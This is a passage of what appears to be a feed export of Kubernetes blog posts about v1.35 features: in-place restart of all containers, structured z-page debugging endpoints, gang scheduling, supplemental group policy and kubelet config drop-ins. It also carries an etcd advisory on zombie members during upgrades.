      "link": "https://kubernetes.io/blog/2026/01/02/kubernetes-v1-35-restart-all-containers/",
      "published": "Fri, 02 Jan 2026 10:30:00 -0800",
      "summary": "<p>The release of Kubernetes 1.35 introduces a powerful new feature that provides a much-requested capability: the ability to trigger a full, in-place restart of the Pod. This feature, <em>Restart All Containers</em> (alpha in 1.35), allows for an efficient way to reset a Pod's state compared to resource-intensive approach of deleting and recreating the entire Pod. This feature is especially useful for AI/ML workloads allowing application developers to concentrate on their core training logic while offloading complex failure-handling and recovery mechanisms to sidecars and declarative Kubernetes configuration. With <code>RestartAllContainers</code> and other planned enhancements, Kubernetes continues to add building blocks for creating the most flexible, robust, and efficient platforms for AI/ML workloads.</p>\n<p>This new functionality is available by enabling the <code>RestartAllContainersOnContainerExits</code> feature gate. This alpha feature extends the <a href=\"https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/#container-restart-rules\"><em>Container Restart Rules</em> feature</a>, which graduated to beta in Kubernetes 1.35.</p>\n<h2 id=\"the-problem-when-a-single-container-restart-isn-t-enough-and-recreating-pods-is-too-costly\">The problem: when a single container restart isn't enough and recreating pods is too costly</h2>\n<p>Kubernetes has long supported restart policies at the Pod level (<code>restartPolicy</code>) and, more recently, at the <a href=\"https://kubernetes.io/blog/2025/08/29/kubernetes-v1-34-per-container-restart-policy/\">individual container level</a>. These policies are great for handling crashes in a single, isolated process. However, many modern applications have more complex inter-container dependencies. For instance:</p>\n<ul>\n<li>An <strong>init container</strong> prepares the environment by mounting a volume or generating a configuration file. If the main application container corrupts this environment, simply restarting that one container is not enough. The entire initialization process needs to run again.</li>\n<li>A <strong>watcher sidecar</strong> monitors system health. If it detects an unrecoverable but retriable error state, it must trigger a restart of the main application container from a clean slate.</li>\n<li>A <strong>sidecar</strong> that manages a remote resource fails. Even if the sidecar restarts on its own, the main container may be stuck trying to access an outdated or broken connection.</li>\n</ul>\n<p>In all these cases, the desired action is not to restart a single container, but all of them. Previously, the only way to achieve this was to delete the Pod and have a controller (like a Job or ReplicaSet) create a new one. This process is slow and expensive, involving the scheduler, node resource allocation and re-initialization of networking and storage.</p>\n<p>This inefficiency becomes even worse when handling large-scale AI/ML workloads (&gt;= 1,000 Nodes with one Pod per Node). A common requirement for these synchronous workloads is that when a failure occurs (such as a Node crash), all Pods in the fleet must be recreated to reset the state before training can resume, even if all the other Pods were not directly affected by the failure. Deleting, creating and scheduling thousands of Pods simultaneously creates a massive bottleneck. The estimated overhead of this failure could cost <a href=\"https://docs.google.com/document/d/16zexVooHKPc80F4dVtUjDYK9DOpkVPRNfSv0zRtfFpk/edit?tab=t.0#bookmark=id.qwqcnzf96avw\">$100,000 per month in wasted resources</a>.</p>\n<p>Handling these failures for AI/ML training jobs requires a complex integration touching both the training framework and Kubernetes, which are often fragile and toilsome. This feature introduces a Kubernetes-native solution, improving system robustness and allowing application developers to concentrate on their core training logic.</p>\n<p>Another major benefit of restarting Pods in place is that keeping Pods on their assigned Nodes allows for further optimizations. For example, one can implement node-level caching tied to a specific Pod identity, something that is impossible when Pods are unnecessarily being recreated on different Nodes.</p>\n<h2 id=\"introducing-the-restartallcontainers-action\">Introducing the <code>RestartAllContainers</code> action</h2>\n<p>To address this, Kubernetes v1.35 adds a new action to the container restart rules: <code>RestartAllContainers</code>. When a container exits in a way that matches a rule with this action, the kubelet initiates a fast, <strong>in-place</strong> restart of the Pod.</p>\n<p>This in-place restart is highly efficient because it preserves the Pod's most important resources:</p>\n<ul>\n<li>The Pod's UID, IP address and network namespace.</li>\n<li>The Pod's sandbox and any attached devices.</li>\n<li>All volumes, including <code>emptyDir</code> and mounted volumes from PVCs.</li>\n</ul>\n<p>After terminating all running containers, the Pod's startup sequence is re-executed from the very beginning. This means all <strong>init containers</strong> are run again in order, followed by the sidecar and regular containers, ensuring a completely fresh start in a known-good environment. With the exception of ephemeral containers (which are terminated), all other containers—including those that previously succeeded or failed—will be restarted, regardless of their individual restart policies.</p>\n<h2 id=\"use-cases\">Use cases</h2>\n<h3 id=\"1-efficient-restarts-for-ml-batch-jobs\">1. Efficient restarts for ML/Batch jobs</h3>\n<p>For ML training jobs, <a href=\"https://kubernetes.io/blog/2025/07/03/navigating-failures-in-pods-with-devices/#roadmap-for-failure-modes-container-code-failed\">rescheduling a worker Pod on failure</a> is a costly operation that wastes valuable compute resources. On a 1,000-node training cluster, rescheduling overhead can waste <a href=\"https://docs.google.com/document/d/16zexVooHKPc80F4dVtUjDYK9DOpkVPRNfSv0zRtfFpk/edit?tab=t.0#bookmark=id.qwqcnzf96avw\">over $100,000 in compute resources monthly</a>.</p>\n<p>With <code>RestartAllContainers</code> actions you can address this by enabling a much faster, hybrid recovery strategy: recreate only the &quot;bad&quot; Pods (e.g., those on unhealthy Nodes) while triggering <code>RestartAllContainers</code> for the remaining healthy Pods. Benchmarks show this reduces the recovery overhead <a href=\"https://docs.google.com/document/d/16zexVooHKPc80F4dVtUjDYK9DOpkVPRNfSv0zRtfFpk/edit?tab=t.0#bookmark=id.cwkee8kar0i5\">from minutes to a few seconds</a>.</p>\n<p>With in-place restarts, a watcher sidecar can monitor the main training process. If it encounters a specific, retriable error, the watcher can exit with a designated code to trigger a fast reset of the worker Pod, allowing it to restart from the last checkpoint without involving the Job controller. This capability is now natively supported by Kubernetes.</p>\n<p>Read more details about future development and JobSet features at <a href=\"https://github.com/kubernetes-sigs/jobset/issues/467\">KEP-467 JobSet in-place restart</a>.</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000;

If the main application fails in a way that corrupts this shared state, you need the <a href=\"https://github.com/kubernetes/enhancements/issues/3676\">init container to rerun</a>.</p>\n<p>By configuring the main application to exit with a specific code upon detecting such a corruption, you can trigger the <code>RestartAllContainers</code> action, guaranteeing that the init container provides a clean setup before the application restarts.</p>\n<h3 id=\"3-handling-high-rate-of-similar-tasks-execution\">3. Handling high rate of similar tasks execution</h3>\n<p>There are cases when tasks are best represented as a Pod execution. And each task requires a clean execution. The task may be a game session backend or some queue item processing. If the rate of tasks is high, running the whole cycle of Pod creation, scheduling and initialization is simply too expensive, especially when tasks can be short. The ability to restart all containers from scratch enables a Kubernetes-native way to handle this scenario without custom solutions or frameworks.</p>\n<h2 id=\"how-to-use-it\">How to use it</h2>\n<p>To try this feature, you must enable the <code>RestartAllContainersOnContainerExits</code> feature gate on your Kubernetes cluster components (API server and kubelet) running Kubernetes v1.35+. This alpha feature extends the <code>ContainerRestartRules</code> feature, which graduated to beta in v1.35 and is enabled by default.</p>\n<p>Once enabled, you can add <code>restartPolicyRules</code> to any container (init, sidecar, or regular) and use the <code>RestartAllContainers</code> action.</p>\n<p>The feature is designed to be easily usable on existing apps. However, if an application does not follow some best practices, it may cause issues for the application or for observability tooling. When enabling the feature, make sure that all containers are reentrant and that external tooling is prepared for init containers to re-run. Also, when restarting all containers, the kubelet does not run <code>preStop</code> hooks. This means containers must be designed to handle abrupt termination without relying on <code>preStop</code> hooks for graceful shutdown.</p>\n<h2 id=\"observing-the-restart\">Observing the restart</h2>\n<p>To make this process observable, a new Pod condition, <code>AllContainersRestarting</code>, is added to the Pod's status. When a restart is triggered, this condition becomes <code>True</code> and it reverts to <code>False</code> once all containers have terminated and the Pod is ready to start its lifecycle anew. This provides a clear signal to users and other cluster components about the Pod's state.</p>\n<p>All containers restarted by this action will have their restart count incremented in the container status.</p>\n<h2 id=\"learn-more\">Learn more</h2>\n<ul>\n<li>Read the official documentation on <a href=\"https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/#restart-all-containers\">Pod Lifecycle</a>.</li>\n<li>Read the detailed proposal in the <a href=\"https://kep.k8s.io/5532\">KEP-5532: Restart All Containers on Container Exits</a>.</li>\n<li>Read the proposal for JobSet in-place restart in <a href=\"https://github.com/kubernetes-sigs/jobset/issues/467\">JobSet issue #467</a>.</li>\n</ul>\n<h2 id=\"we-want-your-feedback\">We want your feedback!</h2>\n<p>As an alpha feature, <code>RestartAllContainers</code> is ready for you to experiment with and any use cases and feedback are welcome.

      "summary": "<p>Debugging Kubernetes control plane components can be challenging, especially when you need to quickly understand the runtime state of a component or verify its configuration. With Kubernetes 1.35, we're enhancing the z-pages debugging endpoints with structured, machine-parseable responses that make it easier to build tooling and automate troubleshooting workflows.</p>\n<h2 id=\"what-are-z-pages\">What are z-pages?</h2>\n<p>z-pages are special debugging endpoints exposed by Kubernetes control plane components. Introduced as an alpha feature in Kubernetes 1.32, these endpoints provide runtime diagnostics for components like <code>kube-apiserver</code>, <code>kube-controller-manager</code>, <code>kube-scheduler</code>, <code>kubelet</code> and <code>kube-proxy</code>. The name &quot;z-pages&quot; comes from the convention of using <code>/*z</code> paths for debugging endpoints.</p>\n<p>Currently, Kubernetes supports two primary z-page endpoints:</p>\n<dl>\n<dt><code>/statusz</code></dt>\n<dd>Displays high-level component information including version information, start time, uptime, and available debug paths</dd>\n<dt><code>/flagz</code></dt>\n<dd>Shows all command-line arguments and their values used to start the component (with confidential values redacted for security)</dd>\n</dl>\n<p>These endpoints are valuable for human operators who need to quickly inspect component state, but until now, they only returned plain text output that was difficult to parse programmatically.</p>\n<h2 id=\"what-s-new-in-kubernetes-1-35\">What's new in Kubernetes 1.35?</h2>\n<p>Kubernetes 1.35 introduces structured, versioned responses for both <code>/statusz</code> and <code>/flagz</code> endpoints.

For example, you can programmatically check if a component has been running with an unexpected emulated version or verify that critical flags are set correctly.</p>\n<h3 id=\"2-better-debugging-tools\">2. <strong>Better debugging tools</strong></h3>\n<p>Developers can build sophisticated debugging tools that compare configurations across multiple components or track configuration drift over time. The structured format makes it trivial to <code>diff</code> configurations or validate that components are running with expected settings.</p>\n<h3 id=\"3-api-versioning-and-stability\">3. <strong>API versioning and stability</strong></h3>\n<p>By introducing versioned APIs (starting with <code>v1alpha1</code>), we provide a clear path to stability. As the feature matures, we'll introduce <code>v1beta1</code> and eventually <code>v1</code>, giving you confidence that your tooling won't break with future Kubernetes releases.</p>\n<h2 id=\"how-to-use-structured-z-pages\">How to use structured z-pages</h2>\n<h3 id=\"prerequisites\">Prerequisites</h3>\n<p>Both endpoints require feature gates to be enabled:</p>\n<ul>\n<li><code>/statusz</code>: Enable the <code>ComponentStatusz</code> feature gate</li>\n<li><code>/flagz</code>: Enable the <code>ComponentFlagz</code> feature gate</li>\n</ul>\n<h3 id=\"example-getting-structured-responses\">Example: Getting structured responses</h3>\n<p>Here's an example using <code>curl</code> to retrieve structured JSON responses from the kube-apiserver:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\"><span style=\"display: flex;\"><span><span style=\"color: #080; font-style: italic;\"># Get structured statusz response</span>\n</span></span><span style=\"display: flex;\"><span>curl <span style=\"color: #b62; font-weight: bold;\">\\\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #b62; font-weight: bold;\"></span> --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt <span style=\"color: #b62; font-weight: bold;\">\\\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #b62; font-weight: bold;\"></span> --key /etc/kubernetes/pki/apiserver-kubelet-client.key <span style=\"color: #b62; font-weight: bold;\">\\\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #b62; font-weight: bold;\"></span> --cacert /etc/kubernetes/pki/ca.crt <span style=\"color: #b62; font-weight: bold;\">\\\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #b62; font-weight: bold;\"></span> -H <span style=\"color: #b44;\">\"Accept: application/json;v=v1alpha1;g=config.k8s.io;as=Statusz\"</span> <span style=\"color: #b62; font-weight: bold;\">\\\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #b62; font-weight: bold;\"></span> https://localhost:6443/statusz | jq .\n</span></span><span style=\"display: flex;\"><span>\n</span></span><span style=\"display: flex;\"><span><span style=\"color: #080; font-style: italic;\"># Get structured flagz response</span>\n</span></span><span style=\"display: flex;\"><span>curl <span style=\"color: #b62; font-weight: bold;\">\\\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #b62; font-weight: bold;\"></span> --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt <span style=\"color: #b62; font-weight: bold;\">\\\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #b62; font-weight: bold;\"></span> --key /etc/kubernetes/pki/apiserver-kubelet-client.key <span style=\"color: #b62; font-weight: bold;\">\\\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #b62; font-weight: bold;\"></span> --cacert /etc/kubernetes/pki/ca.crt <span style=\"color: #b62; font-weight: bold;\">\\\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #b62; font-weight: bold;\"></span> -H <span style=\"color: #b44;\">\"Accept: application/json;v=v1alpha1;g=config.k8s.io;as=Flagz\"</span> <span style=\"color: #b62; font-weight: bold;\">\\\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #b62; font-weight: bold;\"></span> https://localhost:6443/flagz | jq .\n</span></span></code></pre></div>\n<div class=\"alert alert-info\"><h4 class=\"alert-heading\">Note:</h4>The examples above use client certificate authentication and verify the server's certificate using <code>--cacert</code>.\nIf you need to bypass certificate verification in a test environment, you can use <code>--insecure</code> (or <code>-k</code>),\nbut this should never be done in production as it makes you vulnerable to man-in-the-middle attacks.</div>\n<h2 id=\"important-considerations\">Important considerations</h2>\n<h3 id=\"alpha-feature-status\">Alpha feature status</h3>\n<p>The structured z-page responses are an <strong>alpha</strong> feature in Kubernetes 1.35. This means:</p>\n<ul>\n<li>The API format may change in future releases</li>\n<li>These endpoints are intended for debugging, not production automation</li>\n<li>You should avoid relying on them for critical monitoring workflows until they reach beta or stable status</li>\n</ul>\n<h3 id=\"security-and-access-control\">Security and access control</h3>\n<p>z-pages expose internal component information and require proper access controls. Here are the key security considerations:</p>\n<p><strong>Authorization</strong>: Access to z-page endpoints is restricted to members of the <code>system:monitoring</code> group, which follows the same authorization model as other debugging endpoints like <code>/healthz</code>, <code>/livez</code>, and <code>/readyz</code>. This ensures that only authorized users and service accounts can access debugging information. If your cluster uses RBAC, you can manage access by granting appropriate permissions to this group.</p>\n<p><strong>Authentication</strong>: The authentication requirements for these endpoints depend on your cluster's configuration. Unless anonymous authentication is enabled for your cluster, you typically need to use authentication mechanisms (such as client certificates) to access these endpoints.</p>\n<p><strong>Information disclosure</strong>: These endpoints reveal configuration details about your cluster components, including:</p>\n<ul>\n<li>Component versions and build information</li>\n<li>All command-line arguments and their values (with confidential values redacted)</li>\n<li>Available debug endpoints</li>\n</ul>\n<p>Only grant access to trusted operators and debugging tools. Avoid exposing these endpoints to unauthorized users or automated systems that don't require this level of access.</p>\n<h3 id=\"future-evolution\">Future evolution</h3>\n<p>As the feature matures, we (Kubernetes SIG Instrumentation) expect to:</p>\n<ul>\n<li>Introduce <code>v1beta1</code> and eventually <code>v1</code> versions of the API</li>\n<li>Gather community feedback on the response schema</li>\n<li>Potentially add additional z-page endpoints based on user needs</li>\n</ul>\n<h2 id=\"try-it-out\">Try it out</h2>\n<p>We encourage you to experiment with structured z-pages in a test environment:</p>\n<ol>\n<li>Enable the <code>ComponentStatusz</code> and <code>ComponentFlagz</code> feature gates on your control plane components</li>\n<li>Try querying the endpoints with both plain text and structured formats</li>\n<li>Build a simple tool or script that uses the structured data</li>\n<li>Share your feedback with the community</li>\n</ol>\n<h2 id=\"learn-more\">Learn more</h2>\n<ul>\n<li><a href=\"https://kubernetes.io/docs/reference/instrumentation/zpages/\">z-pages documentation</a></li>\n<li><a href=\"https://github.com/kubernetes/enhancements/blob/master/keps/sig-instrumentation/4827-component-statusz/README.md\">KEP-4827: Component Statusz</a></li>\n<li><a href=\"https://github.com/kubernetes/enhancements/blob/master/keps/sig-instrumentation/4828-component-flagz/README.md\">KEP-4828: Component Flagz</a></li>\n<li>Join the discussion in the <a href=\"https://kubernetes.slack.com/archives/C20HH14P7\">#sig-instrumentation</a> channel on Kubernetes Slack</li>\n</ul>\n<h2 id=\"get-involved\">Get involved</h2>\n<p>We'd love to hear your feedback!

      "summary": "<p>Scheduling large workloads is a much more complex and fragile operation than scheduling a single Pod,\nas it often requires considering all Pods together instead of scheduling each one independently.\nFor example, when scheduling a machine learning batch job, you often need to place each worker strategically,\nsuch as on the same rack, to make the entire process as efficient as possible.\nAt the same time, the Pods that are part of such a workload are very often identical\nfrom the scheduling perspective, which fundamentally changes how this process should look.</p>\n<p>There are many custom schedulers adapted to perform workload scheduling efficiently,\nbut considering how common and important workload scheduling is to Kubernetes users,\nespecially in the AI era with the growing number of use cases,\nit is high time to make workloads a first-class citizen for <code>kube-scheduler</code> and support them natively.</p>\n<h2 id=\"workload-aware-scheduling\">Workload aware scheduling</h2>\n<p>The recent 1.35 release of Kubernetes delivered the first tranche of <em>workload aware scheduling</em> improvements.\nThese are part of a wider effort that is aiming to improve scheduling and management of workloads.\nThe effort will span over many SIGs and releases, and is supposed to gradually expand\ncapabilities of the system toward reaching the north star goal,\nwhich is seamless workload scheduling and management in Kubernetes including,\nbut not limited to, preemption and autoscaling.</p>\n<p>Kubernetes v1.35 introduces the Workload API that you can use to describe the desired shape\nas well as scheduling-oriented requirements of the workload. It comes with an initial implementation\nof <em>gang scheduling</em> that instructs the <code>kube-scheduler</code> to schedule gang Pods in the <em>all-or-nothing</em> fashion.\nFinally, we improved scheduling of identical Pods (that typically make a gang) to speed up the process\nthanks to the <em>opportunistic batching</em> feature.</p>\n<h2 id=\"workload-api\">Workload API</h2>\n<p>The new Workload API resource is part of the <code>scheduling.k8s.io/v1alpha1</code>\n<a class=\"glossary-tooltip\" href=\"https://kubernetes.io/docs/concepts/overview/kubernetes-api/#api-groups-and-versioning\" target=\"_blank\" title=\"A set of related paths in the Kubernetes API.\">API group</a>.\nThis resource acts as a structured, machine-readable definition of the scheduling requirements\nof a multi-Pod application. While user-facing workloads like Jobs define what to run, the Workload resource\ndetermines how a group of Pods should be scheduled and how its placement should be managed\nthroughout its lifecycle.</p>\n<p>A Workload allows you to define a group of Pods and apply a scheduling policy to them.\nHere is what a gang scheduling configuration looks like.

Without gang scheduling,\na Job might be partially scheduled, consuming resources without being able to run,\nleading to resource wastage and potential deadlocks.</p>\n<p>When you create Pods that are part of a gang-scheduled pod group, the scheduler's <code>GangScheduling</code>\nplugin manages the lifecycle independently for each pod group (or replica key):</p>\n<ol>\n<li>\n<p>When you create your Pods (or a controller makes them for you),\nthe scheduler blocks them from scheduling, until:</p>\n<ul>\n<li>The referenced Workload object is created.</li>\n<li>The referenced pod group exists in a Workload.</li>\n<li>The number of pending Pods in that group meets your <code>minCount</code>.</li>\n</ul>\n</li>\n<li>\n<p>Once enough Pods arrive, the scheduler tries to place them. However,\ninstead of binding them to nodes immediately, the Pods wait at a <code>Permit</code> gate.</p>\n</li>\n<li>\n<p>The scheduler checks if it has found valid assignments for the entire group (at least the <code>minCount</code>).</p>\n<ul>\n<li>If there is room for the group, the gate opens, and all Pods are bound to nodes.</li>\n<li>If only a subset of the group pods was successfully scheduled within a timeout (set to 5 minutes),\nthe scheduler rejects <strong>all</strong> of the Pods in the group.\nThey go back to the queue, freeing up the reserved resources for other workloads.</li>\n</ul>\n</li>\n</ol>\n<p>We'd like to point out that that while this is a first implementation, the Kubernetes project firmly\nintends to improve and expand the gang scheduling algorithm in future releases.\nBenefits we hope to deliver include a single-cycle scheduling phase for a whole gang,\nworkload-level preemption, and more, moving towards the north star goal.</p>\n<h2 id=\"opportunistic-batching\">Opportunistic batching</h2>\n<p>In addition to explicit gang scheduling, v1.35 introduces <em>opportunistic batching</em>.\nThis is a Beta feature that improves scheduling latency for identical Pods.</p>\n<p>Unlike gang scheduling, this feature does not require the Workload API\nor any explicit opt-in on the user's part. It works opportunistically within the scheduler\nby identifying Pods that have identical scheduling requirements (container images, resource requests,\naffinities, etc.). When the scheduler processes a Pod, it can reuse the feasibility calculations\nfor subsequent identical Pods in the queue, significantly speeding up the process.</p>\n<p>Most users will benefit from this optimization automatically, without taking any special steps,\nprovided their Pods meet the following criteria.</p>\n<h3 id=\"restrictions\">Restrictions</h3>\n<p>Opportunistic batching works under specific conditions. All fields used by the <code>kube-scheduler</code>\nto find a placement must be identical between Pods. Additionally, using some features\ndisables the batching mechanism for those Pods to ensure correctness.</p>\n<p>Note that you may need to review your <code>kube-scheduler</code> configuration\nto ensure it is not implicitly disabling batching for your workloads.</p>\n<p>See the <a href=\"https://kubernetes.io/docs/concepts/scheduling-eviction/scheduler-perf-tuning/#enabling-opportunistic-batching\">docs</a> for more details about restrictions.</p>\n<h2 id=\"the-north-star-vision\">The north star vision</h2>\n<p>The project has a broad ambition to deliver workload aware scheduling.\nThese new APIs and scheduling enhancements are just the first steps.\nIn the near future, the effort aims to tackle:</p>\n<ul>\n<li>Introducing a workload scheduling phase</li>\n<li>Improved support for multi-node <a href=\"https://kubernetes.io/docs/concepts/scheduling-eviction/dynamic-resource-allocation/\">DRA</a>\nand topology aware scheduling</li>\n<li>Workload-level preemption</li>\n<li>Improved integration between scheduling and autoscaling</li>\n<li>Improved interaction with external workload schedulers</li>\n<li>Managing placement of workloads throughout their entire lifecycle</li>\n<li>Multi-workload scheduling simulations</li>\n</ul>\n<p>And more.

These implicit GIDs can't be detected or validated by policy engines because there's no record of them in the Pod manifest. This can lead to unexpected access control issues, particularly when accessing volumes (see <a href=\"https://issue.k8s.io/112879\">kubernetes/kubernetes#112879</a> for details) because file permission is controlled by UID/GIDs in Linux.</p>\n<h2 id=\"fine-grained-supplemental-groups-control-in-a-pod-supplementarygroupspolicy\">Fine-grained supplemental groups control in a Pod: <code>supplementaryGroupsPolicy</code></h2>\n<p>To tackle this problem, a Pod's <code>.spec.securityContext</code> now includes <code>supplementalGroupsPolicy</code> field.</p>\n<p>This field lets you control how Kubernetes calculates the supplementary groups for container processes within a Pod. The available policies are:</p>\n<ul>\n<li>\n<p><em>Merge</em>: The group membership defined in <code>/etc/group</code> for the container's primary user will be merged. If not specified, this policy will be applied (i.e. as-is behavior for backward compatibility).</p>\n</li>\n<li>\n<p><em>Strict</em>: Only the group IDs specified in <code>fsGroup</code>, <code>supplementalGroups</code>, or <code>runAsGroup</code> are attached as supplementary groups to the container processes. Group memberships defined in <code>/etc/group</code> for the container's primary user are ignored.</p>\n</li>\n</ul>\n<p>I'll explain how the <code>Strict</code> policy works.

If the container has sufficient privilege\nto call system calls related to process identity (e.g. <a href=\"https://man7.org/linux/man-pages/man2/setuid.2.html\"><code>setuid(2)</code></a>, <a href=\"https://man7.org/linux/man-pages/man2/setgid.2.html\"><code>setgid(2)</code></a> or <a href=\"https://man7.org/linux/man-pages/man2/setgroups.2.html\"><code>setgroups(2)</code></a>, etc.), the container process can change its identity. Thus, the <em>actual</em> process identity will be dynamic.</p>\n<p>There are several ways to restrict these permissions in containers. We suggest the belows as simple solutions:</p>\n<ul>\n<li>setting <code>privilege: false</code> and <code>allowPrivilegeEscalation: false</code> in your container's <code>securityContext</code>, or</li>\n<li>conform your pod to <a href=\"https://kubernetes.io/docs/concepts/security/pod-security-standards/#restricted\"><code>Restricted</code> policy in Pod Security Standard</a>.</li>\n</ul>\n<p>Also, kubelet has no visibility into NRI plugins or container runtime internal workings. Cluster Administrator configuring nodes or highly privilege workloads with the permission of a local administrator may change supplemental groups for any pod. However this is outside of a scope of Kubernetes control and should not be a concern for security-hardened nodes.</p>\n</div>\n<h2 id=\"strict-policy-requires-up-to-date-container-runtimes\"><code>Strict</code> policy requires up-to-date container runtimes</h2>\n<p>The high level container runtime (e.g. containerd, CRI-O) plays a key role for calculating supplementary group ids\nthat will be attached to the containers. Thus, <code>supplementalGroupsPolicy: Strict</code> requires a CRI runtime that support this feature.\nThe old behavior (<code>supplementalGroupsPolicy: Merge</code>) can work with a CRI runtime that does not support this feature,\nbecause this policy is fully backward compatible.</p>\n<p>Here are some CRI runtimes that support this feature, and the versions you need\nto be running:</p>\n<ul>\n<li>containerd: v2.0 or later</li>\n<li>CRI-O: v1.31 or later</li>\n</ul>\n<p>And, you can see if the feature is supported in the Node's <code>.status.features.supplementalGroupsPolicy</code> field.

This diversity necessitates different kubelet configurations across node groups—yet managing these varied configurations at scale becomes increasingly challenging. Several pain points emerge:</p>\n<ul>\n<li><strong>Configuration drift</strong>: Different nodes may have slightly different configurations, leading to inconsistent behavior</li>\n<li><strong>Node group customization</strong>: GPU nodes, edge nodes, and standard compute nodes often require different kubelet settings</li>\n<li><strong>Operational overhead</strong>: Maintaining separate, complete configuration files for each node type is error-prone and difficult to audit</li>\n<li><strong>Change management</strong>: Rolling out configuration changes across heterogeneous node pools requires careful coordination</li>\n</ul>\n<p>Before this support was added to Kubernetes, cluster administrators had to choose between using a single monolithic configuration file for all nodes,\nmanually maintaining multiple complete configuration files, or relying on separate tooling. Each approach had its own drawbacks.\nThis graduation to stable gives cluster administrators a fully supported fourth way to solve that challenge.</p>\n<h2 id=\"example-use-cases\">Example use cases</h2>\n<h3 id=\"managing-heterogeneous-node-pools\">Managing heterogeneous node pools</h3>\n<p>Consider a cluster with multiple node types: standard compute nodes, high-capacity nodes (such as those with GPUs or large amounts of memory), and edge nodes with specialized requirements.</p>\n<h4 id=\"base-configuration\">Base configuration</h4>\n<p>File: <code>00-base.conf</code></p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000;

This ensures your cluster is automatically repaired, and avoids zombie members.</p>\n<h2 id=\"issue-summary\">Issue summary</h2>\n<p>Recently, the etcd community addressed an issue that may appear when users <a href=\"https://etcd.io/docs/v3.6/upgrades/upgrade_3_6/\">upgrade from v3.5 to v3.6</a>. This bug can cause the cluster to report &quot;zombie members&quot;, which are etcd nodes that were removed from the database cluster some time ago, and are re-appearing and joining database consensus. The etcd cluster is then inoperable until these zombie members are removed.</p>\n<p>In etcd v3.5 and earlier, the v2store was the source of truth for membership data, even though the v3store was also present. As a part of our <a href=\"https://github.com/etcd-io/etcd/issues/12913\">v2store deprecation plan</a>, in v3.6 the v3store is the source of truth for cluster membership. Through a <a href=\"https://github.com/etcd-io/etcd/issues/20967\">bug report</a> we found out that, in some older clusters, v2store and v3store could become inconsistent. This inconsistency manifests after upgrading as seeing old, removed &quot;zombie&quot; cluster members re-appearing in the cluster.</p>\n<h2 id=\"the-fix-and-upgrade-path\">The fix and upgrade path</h2>\n<p>We’ve added a <a href=\"https://github.com/etcd-io/etcd/pull/20995\">mechanism in etcd v3.5.26</a> to automatically sync v3store from v2store, ensuring that affected clusters are repaired before upgrading to 3.6.x.</p>\n<p>To support the many users currently upgrading to 3.6, we have provided the following safe upgrade path:</p>\n<ol>\n<li>Upgrade your cluster to <a href=\"https://github.com/etcd-io/etcd/releases/tag/v3.5.26\">v3.5.26</a> or later.</li>\n<li>Wait and confirm that all members are healthy post-update.</li>\n<li>Upgrade to v3.6.</li>\n</ol>\n<p>We are unable to provide a safe workaround path for users who have some obstacle preventing updating to v3.5.26. As such, if v3.5.26 is not available from your packaging source or vendor, you should delay upgrading to v3.6 until it is.</p>\n<h2 id=\"additional-technical-detail\">Additional technical detail</h2>\n<p><strong>Information below is offered for reference only. Users can follow the safe upgrade path without knowledge of the following details.</strong></p>\n<p>This issue is encountered with clusters that have been running in production on etcd v3.5.25 or earlier. It is a side effect of adding and removing members from the cluster, or recovering the cluster from failure. This means that the issue is more likely the older the etcd cluster is, but it cannot be ruled out for any user regardless of the age of the cluster.</p>\n<p>etcd maintainers, working with issue reporters, have found three possible triggers for the issue based on symptoms and an analysis of etcd code and logs:</p>\n<ol>\n<li><strong>Bug in <code>etcdctl snapshot restore</code> (v3.4 and old versions)</strong>: When restoring a snapshot using <code>etcdctl snapshot restore</code>, etcdctl was supposed to remove existing members before adding the new ones. In v3.4, due to a bug, old members were not removed, resulting in zombie members. Refer to the <a href=\"https://github.com/etcd-io/etcd/issues/20967#issuecomment-3618010356\">comment on etcdctl</a>.</li>\n<li><strong><code>--force-new-cluster</code> in v3.5 and earlier versions</strong>: In rare cases, forcibly creating a new single-member cluster did not fully remove old members, leaving zombies. The issue was <a href=\"https://github.com/etcd-io/etcd/pull/20339\">resolved</a> in v3.5.22. Please refer to <a href=\"https://github.com/etcd-io/raft/pull/300\">this PR</a> in the Raft project for detailed technical information.</li>\n<li><strong>--unsafe-no-sync enabled</strong>: If <code>--unsafe-no-sync</code> is enabled, in rare cases etcd might persist a membership change to v3store but crash before writing it to the WAL, causing inconsistency between v2store and v3store. This is a problem for single-member clusters. For multi-member clusters, forcibly creating a new single-member cluster from the crashed node’s data may lead to zombie members.</li>\n</ol>\n<div class=\"alert alert-info\">\n<h4 class=\"alert-heading\">Note</h4>\n<code>--unsafe-no-sync</code> is generally not recommended, as it may break the guarantees given by the consensus protocol.\n</div>\n<p>Importantly, there may be other triggers for v2store and v3store membership data becoming inconsistent that we have not yet found. This means that you cannot assume that you are safe just because you have not performed any of the three actions above.\nOnce users are upgraded to etcd v3.6, v3store becomes the source of membership data, and further inconsistency is not possible.</p>\n<p>Advanced users who want to verify the consistency between v2store and v3store can follow the steps described in this <a href=\"https://github.com/etcd-io/etcd/issues/20967#issuecomment-3590609775\">comment</a>.

